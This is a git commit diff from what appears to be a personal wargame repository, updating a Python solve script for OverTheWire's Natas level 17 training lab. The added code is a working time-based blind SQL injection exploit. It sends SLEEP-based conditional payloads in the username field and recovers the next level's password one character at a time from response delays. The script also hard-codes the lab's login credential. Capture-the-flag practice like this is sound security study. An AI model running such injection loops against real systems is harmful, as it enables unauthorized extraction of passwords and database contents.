87e7705cad31c790d9cbe5e1adb851bdffe05601
Rodrigo Carvalho <rodrigorsdc@gmail.com>
2024-12-29 11:25:07 -0300

    natas: add natas17 flag and update natas17 solve

--- natas/natas17/solve.py
+++ natas/natas17/solve.py
@@ -1,15 +1,27 @@
 import requests
+import time
 
 url = 'http://natas17.natas.labs.overthewire.org'
 user = 'natas17'
 password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
 
-data = {'username' : '" <sdcript> </script>', 'debug' : '1'}
-response = requests.get(url, auth=(user, password), params=data)
 
-print(response.text)
-data = {'username' : 'natas17'} 
-response2 = requests.get(url, auth=(user, password), params=data)
+natas18_pass = ''
+caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+for i in range(1, 33):
+    time_max = 0
+    caractere_max = ''
+    for c in caracteres:
+        data = {'username' : f'natas18" and IF(BINARY SUBSTRING(password, {i}, 1) = "{c}", SLEEP(3), null) # '} 
+        start = time.time()
+        response2 = requests.get(url, auth=(user, password), params=data)
+        finished = time.time() - start
+        print(f'Caractere {c} na posição {i}. Tempo: {finished}')
+        if (finished > time_max):
+            caractere_max = c
+            time_max = finished
 
-print(response2.text)
-print(response.content == response2.content)
+    print(f'Caractere vencedor {caractere_max} na posição {i}')
+    natas18_pass = natas18_pass + caractere_max
+print(natas18_pass)
+#print(response.content == response2.content)
